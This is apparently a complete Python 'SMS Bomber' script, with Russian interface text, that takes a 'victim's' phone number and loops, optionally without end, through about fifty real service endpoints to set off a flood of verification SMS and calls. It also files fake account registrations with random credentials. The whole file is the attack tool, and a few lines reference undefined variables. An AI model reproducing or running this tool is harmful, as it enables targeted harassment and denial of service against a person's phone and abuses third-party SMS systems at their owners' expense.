banner0 = '''
    ██████ ██   ██ ██████
    ██▒▒▒▒ ███ ███ ██▒▒▒▒
    ██████ ██▒█▒██ ██████
    ▒▒▒▒██ ██   ██ ▒▒▒▒██
    ██████ ██   ██ ██████
    ▒▒▒▒▒▒ ▒▒   ▒▒ ▒▒▒▒▒▒
    SMS Bomber, v0.2
    '''
banner1 = '''
    1 - Начать атаку
    2 - Информация о проекте
    '''
banner2 = '''  
    Разработчик: MatroCholo
    Сайт проекта: github.com/MatroCholo/sms-bomber
    '''

try:
    import random, datetime, sys, argparse, os
    from time import sleep
except ImportError:
    print('Критическая ошибка! Убедитесь, что Python 3.x верно установлен.')
    sys.exit(1)
try:
    import requests
except ImportError:
    print('Ошибка! Не удалось импортировать необходимые библиотеки.')
    print('Введите "pip install requests colorama" для исправления ошибки.')
    sys.exit(1)

def Logo():
    global phone
    global name
    global iteration
    print(banner0)
    print(banner1)
    iteration = 0
    name = ''
    settings = int(input('>>  '))
    if settings == 1:
        phone = input('Номер жертвы:  ')
        count = int(input('Количество циклов (0 - бесконечно):  '))
        if count == 0:
            while True:
                bombing()
                try:
                    iteration += 1
                    print(iteration, ' круг пройден. ')
                except:
                    break
        else:
            for i in range(count):
                bombing()
                try:
                    i += 1
                    print(i, ' круг пройден. ')
                except:
                    break
    if settings == 2:
        print(banner0)
        print(banner2)
              
    else:
        print('Secret Menu, v0.2 Ultra')
        lol = input('Enter password: ')
        print('"',lol,'"', 'is not the correct password. Exiting...')
        sys.exit(1)
        
def bombing():
    global phone
    global name
    global iteration
    if phone[0] == '+':
        phone = phone[1:]
    if phone[0] == '8':
        phone = '7' + phone[1:]
    if phone[0] == '9':
        phone = '7' + phone
    for x in range(12):
        name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    email = name+f'{iteration}'+'@gmail.com'
    email = name+f'{iteration}'+'@gmail.com'
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('[+] Grab отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()['res']
        print('[+] RuTaxi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
        print('[+] BelkaCar отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
        print('[+] Tinkoff отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
        print('[+] MTS отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'})
        print('[+] PizzaHut отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone})
        print('[+] Rabota отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
        print('[+] Rutube отправлено!')
    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
        print('[+] Citilink отправлено!')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
        print('[+] Smsint отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en')
        print('[+] oyorooms отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
        print('[+] MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('[+] newnext отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
        print('[+] Sunlight отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': email, 'mobilephone': phone, 'deliveryOption': 'sms'})
        print('[+] alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
        print('[+] Sberbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print('[+] Psbank отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        print('[+] Beltelcom отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        print('[+] KFC отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.carsmile.com/',json={'operationName': 'enterPhone', 'variables': {'phone': phone},'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
        print('[+] carsmile отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        print('[+] Citilink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.delitime.ru/api/v2/signup',data={'SignupForm[username]': phone, 'SignupForm[device_type]': 3})
        print('[+] Delitime отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
        print('[+] findclone звонок отправлен!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://guru.taxi/api/v1/driver/session/verify',json={'phone': {'code': 1, 'number': phone}})
        print('[+] Guru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, 'locale': 'en', 'countryCode': 'ru','version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'})
        print('[+] ICQ отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru',data={'mode': 'request', 'phone': '+' + phone,'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6','osversion': 'unknown', 'devicemodel': 'unknown'})
        print('[+] InDriver отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'password': password, 'application': 'lkp', 'login': '+' + phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={'phone': phone})
        print('[+] Pmsm отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6',data={'phone': phone})
        print('[+] IVI отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formattedphone})
        print('[+] Lenta отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '+' + phone, 'api': 2, 'email': 'email','x-email': 'x-email'})
        print('[+] Mail.ru отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={'pageName': 'registerPrivateUserPhoneVerificatio'},data={'phone': phone, 'recaptcha': 'off', 'g-recaptcha-response': ''})
        print('[+] MVideo отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',data={'st.r.phone': '+' + phone})
        print('[+] OK отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://plink.tech/register/',json={'phone': phone})
        print('[+] Plink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',json={'phone': phone})
        print('[+] qlean отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('http://smsgorod.ru/sendsms.php',data={'number': phone})
        print('[+] SMSgorod отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'})
        print('[+] CabWiFi отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.wowworks.ru/v2/site/send-code',json={'phone': phone, 'type': 2})
        print('[+] wowworks отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={'phone_number': '+' + phone})
        print('[+] Eda.Yandex отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={'client_type': 'personal', 'email': f'{email}@gmail.ru','mobilephone': phone, 'deliveryOption': 'sms'})
        print('[+] Alpari отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode',data={'phone': phone})
        print('[+] SMS отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': phone})
        print('[+] Delivery отправлено!')
    except:
        print('[-] Не отправлено!')

Logo()
